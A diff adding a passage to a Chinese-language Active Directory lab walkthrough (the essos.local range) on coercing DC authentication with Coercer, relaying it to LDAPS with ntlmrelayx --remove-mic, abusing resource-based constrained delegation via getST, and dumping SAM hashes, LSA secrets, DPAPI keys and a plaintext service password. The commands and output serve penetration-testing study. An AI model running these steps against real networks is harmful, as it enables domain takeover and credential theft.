@@ -506,8 +506,81 @@ impacket-ntlmrelayx -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.l
 
 ## Coerced auth smb + ntlmrelayx to ldaps with drop the mic
 
-可以使用多种方法（petitpotam、printerbug、DFSCoerce）强制从 meereen DC 到我们的主机的连接
-要强制执行强制操作而不需要在不同方法之间进行选择，我们可以使用刚刚提出的一体化工具[coercer](https://github.com/p0dalirius/Coercer)
+可以使用多种方法（petitpotam、printerbug、DFSCoerce）强制 meereen DC 连接到服务器上
+要执行强制操作而不是从多种方式上选择，可以使用一体化工具[coercer](https://github.com/p0dalirius/Coercer)
+
+根据[hackndo博客](https://en.hackndo.com/ntlm-relay/)和[thehacker](https://www.thehacker.recipes/ad/movement/ntlm/relay)可以知道SMBv2无法跨协议中继到ldpa(s)上（除非有CVE-2019-1040漏洞）
+
+启动ntlmrelayx，移除mic，跨协议中继到ldpas，创建新的计算机帐户并授予其对受害计算机的委派权限
+
+```bash
+impacket-ntlmrelayx -t ldaps://meereen.essos.local -smb2support --remove-mic --add-computer fake03 --delegate-access
+```
+
+在Server braavos 上运行强制身份验证（Server braavos 是最新的 Windows Server 2016，因此未经身份验证的 petitpotam 在这里不起作用）
+
+靶场设计者提供以下命令，域用户khal.drogo之前从未获取密码，笔者推测之所以如此，是因为设计者想展示如何在域环境中从域用户提升到域中机器的管理员权限（攻击方法和前面一样NTLM中继和RBCD攻击二者完美结合）
+
+```bash
+Coercer coerce -u khal.drogo -d essos.local -p horse -t braavos.essos.local -l 192.168.56.1
+```
+
+虽然ntlmrelayx有报错，但是Coercer尝试到EfsRpcOpenFileRaw方法时可以看到fake03计算机创建成功
+
+![Coerced+ntlmrelayx](images/Coerced+ntlmrelayx.png)
+
+之后便依照之前攻击RBCD（资源的约束委派）方式，提升到braavos机器的管理员权限
+
+```bash
+impacket-getST -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS.LOCAL/fake03$:7>nbN{V(V_,M/rv'
+```
+
+```bash
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]  Requesting S4U2self
+[*]  Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+```
+
+```bash
+export KRB5CCNAME=Administrator.ccache
+```
+
+```bash
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x9bb24fb9e9684ce8333026b4e7a67a4c
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:492c19fde6db57a251bf44c2b756ec3b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
+[*] Dumping cached domain logon information (domain/username:hash)
+ESSOS.LOCAL/sql_svc:$DCC2$10240#sql_svc#89e701ebbd305e4f5380c5150494584a
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+ESSOS\BRAAVOS$:plain_password_hex:edac40d9659b8ff518930713a28b8c320ac028f62422b9cc827e8c168e3724e385101235ccbf681865fa403b7ed147ab9cca05df1af00224002c4bc55c5981287c7ad9d861d32e5ea1e3dc3909792e414a3d80de6580867a5b9d43d8cb06e18a7546a9a20ad16addd7a96be91cb4cd0ec6753f9e9807fe9c4c0209bb7a2d5c4e61113548fe74158e0d81e3f80a1bc9f1e9467c231ae98553d952edf7754a0e0a2671284efee120f0a8ad398566d12bf8ebd77b2b701f2b4f73d8958f0c1736b5bbd3a709d2dbc1c06d0e406d6e17f7e8401de0f1fb53434ecf298bf091217dd9a4d5b13e8cfc5bf67dcbcf759ac8a3b0
+ESSOS\BRAAVOS$:aad3b435b51404eeaad3b435b51404ee:8e041276acf964a317f358c9d7fa71fd:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x15a98c9d9a40dbd9f71472cc20e6ed21046177d8
+dpapi_userkey:0x1935d54fb2e3d629e6dbf76dbc988c08a31529a2
+[*] NL$KM 
+ 0000   26 72 00 BB 64 CB DD D7  34 20 B4 AC 7E 9A 99 05   &r..d...4 ..~...
+ 0010   75 95 40 EF C7 ED 72 3E  F4 66 93 E7 3D C9 B8 56   u.@...r>.f..=..V
+ 0020   EC E8 6E 4E 40 13 86 34  A8 F6 E6 36 C6 71 9F 7A   ..nN@..4...6.q.z
+ 0030   8F 63 A3 23 D9 37 A0 BC  07 C0 0B 06 41 21 5E 64   .c.#.7......A!^d
+NL$KM:267200bb64cbddd73420b4ac7e9a9905759540efc7ed723ef46693e73dc9b856ece86e4e40138634a8f6e636c6719f7a8f63a323d937a0bc07c00b0641215e64
+[*] _SC_MSSQL$SQLEXPRESS 
+essos.local\sql_svc:YouWillNotKerboroast1ngMeeeeee
+[*] Cleaning up... 
+[*] Stopping service RemoteRegistry
+```
 
 参考链接：
 
